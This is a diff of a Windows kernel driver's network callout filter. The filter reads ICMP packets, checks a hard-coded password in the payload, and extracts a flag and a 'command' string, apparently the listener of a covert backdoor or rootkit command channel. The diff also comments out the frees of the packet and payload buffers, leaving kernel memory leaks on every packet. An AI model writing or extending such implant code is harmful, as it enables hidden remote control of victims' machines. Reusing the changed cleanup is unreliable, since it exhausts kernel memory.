@@ -105,14 +105,14 @@ VOID CalloutFilter(
     // Copy the packet
     PBYTE icmpPacket = (PBYTE)NdisGetDataBuffer(firstFragment, (ULONG)icmpLength, icmpBuffer, 1, 0);
     if (!icmpPacket)
-        goto freeBuffer;
+        return;
 
     BYTE icmpPassword[4] = {0};
     RtlCopyMemory(icmpPassword, &icmpPacket[8], 4);
 
     if (!RtlEqualMemory(icmpPassword, PASSWORD, 4)) {
         KdPrint(("[PER Driver] Invalid password in ICMP packet\n"));
-        goto freeBuffer;
+        return;
     }
 
     BYTE icmpFlag = icmpPacket[12];
@@ -120,7 +120,7 @@ VOID CalloutFilter(
     // Allocate for ICMP payload
     LPSTR icmpPayload = ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)(payloadLength + 1), ALLOC_TAG_NAME); 
     if (!icmpPayload)
-        goto freeBuffer;
+        return;
 
     // Extract payload
     RtlZeroMemory(icmpPayload, payloadLength + 1);
@@ -132,10 +132,10 @@ VOID CalloutFilter(
     KdPrint(("[PER Driver] Flag: 0x%x\n", icmpFlag));
     KdPrint(("[PER Driver] Command: %s\n", icmpPayload));
 
-    ExFreePoolWithTag((PVOID)icmpPayload, ALLOC_TAG_NAME);
+    // ExFreePoolWithTag((PVOID)icmpPayload, ALLOC_TAG_NAME);
 
-freeBuffer:
-    ExFreePoolWithTag((PVOID)icmpBuffer, ALLOC_TAG_NAME);
+//freeBuffer:
+    //ExFreePoolWithTag((PVOID)icmpBuffer, ALLOC_TAG_NAME);
 }
 
 NTSTATUS CalloutNotify(
